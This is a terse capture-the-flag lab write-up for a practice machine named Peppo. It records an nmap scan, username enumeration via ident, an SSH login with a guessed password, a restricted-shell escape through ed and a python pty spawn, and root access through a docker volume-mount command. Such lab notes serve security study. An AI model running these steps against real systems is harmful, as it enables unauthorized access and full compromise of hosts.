# Peppo
# date 19/8/2023
# ip 192.168.164.60

easy gussable creds to ssh > get out rbash with gtfo > grp member of docker > gtfo commands got root

# nmap
PORT      STATE  SERVICE           REASON         VERSION
22/tcp    open   ssh               syn-ack ttl 61 OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
53/tcp    closed domain            reset ttl 61
113/tcp   open   ident             syn-ack ttl 61 FreeBSD identd
5432/tcp  open   postgresql        syn-ack ttl 60 PostgreSQL DB 12.3 - 12.4
8080/tcp  open   http              syn-ack ttl 60 WEBrick httpd 1.4.2 (Ruby 2.6.6 (2020-03-31))
10000/tcp open   snet-sensor-mgmt? syn-ack ttl 61


└─$ ident-user-enum 192.168.164.60 10000
192.168.164.60:10000    eleanor


always try name as pass

ssh
eleanor:eleanor

got shell but ristricted

eleanor@peppo:~$ echo $PATH
/home/eleanor/bin
eleanor@peppo:~$ ls /home/eleanor/bin
chmod  chown  ed  ls  mv  ping  sleep  touch


gtfobins

ed
!/bin/sh

PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
python -c 'import pty; pty.spawn("/bin/bash")'
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin




# priv esc
id
docker image ls

docker run -v /:/mnt --rm -it redmine chroot /mnt sh



